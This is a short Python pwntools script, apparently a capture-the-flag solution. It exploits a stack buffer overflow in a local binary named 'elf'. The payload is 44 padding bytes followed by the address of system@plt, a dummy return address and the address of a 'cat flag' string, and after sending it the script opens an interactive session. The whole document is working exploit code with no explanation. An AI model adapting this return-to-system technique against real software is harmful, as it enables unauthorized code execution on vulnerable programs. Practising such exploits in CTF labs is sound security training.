from pwn import *
context.log_level = 'debug'

p="./elf"

sys_plt=0x08048430
catflag=0x0804A030

context.binary=p
io=process(p)

payload="A"*44+p32(sys_plt)+p32(0xdeadbeef)+p32(catflag)
io.sendline(payload)

io.interactive()
